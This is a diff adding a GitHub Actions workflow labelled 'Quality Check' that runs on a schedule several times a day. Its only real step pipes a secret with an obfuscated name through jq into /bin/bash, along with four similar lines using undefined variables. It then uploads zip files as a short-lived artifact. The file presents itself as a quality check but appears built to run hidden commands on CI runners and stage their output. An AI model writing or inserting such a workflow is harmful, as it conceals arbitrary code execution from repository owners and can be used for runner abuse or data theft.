@@ -1,0 +1,33 @@
+name: Quality Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '40 5,11,17,23 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  validate:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run task
+        env:
+          icszb3731: ${{ secrets.icszb3731 }}
+        run: |
+          printf '%s' "$icszb3731" | jq -r .z98308 | /bin/bash
+          printf '%s' "$wadwu039" | jq -r .sqetz892 | /bin/bash
+          printf '%s' "$ek6" | jq -r .lekum5813 | /bin/bash
+          printf '%s' "$iwu160" | jq -r .iaidc0 | /bin/bash
+          printf '%s' "$x59993" | jq -r .jgiee5 | /bin/bash
+
+      - name: Store output
+        uses: actions/upload-artifact@v4
+        with:
+          name: ghCXTLV5
+          path: "*.zip"
+          retention-days: 1
